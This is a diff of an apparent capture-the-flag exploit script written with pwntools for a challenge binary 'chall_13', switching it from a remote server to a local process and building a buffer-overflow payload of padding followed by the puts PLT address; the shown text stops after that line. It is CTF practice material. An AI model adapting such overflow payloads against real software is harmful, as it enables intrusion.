@@ -1,18 +1,8 @@
 from pwn import *
 
 binary = context.binary = ELF('./chall_13')
-context.log_level = 'INFO'
 
-if not args.REMOTE:
-    context.log_file = 'local.log'
-    libc = binary.libc
-    p = process(binary.path)
-else:
-    context.log_file = 'remote.log'
-    libc_index = 1
-    p = remote('chal.2020.sunshinectf.org', 30013)
-
-p.sendlineafter('Keep on writing\n','foobar')
+p = process('./chall_13')
 
 payload  = 0x3e * b'A'
 payload += p32(binary.plt.puts)
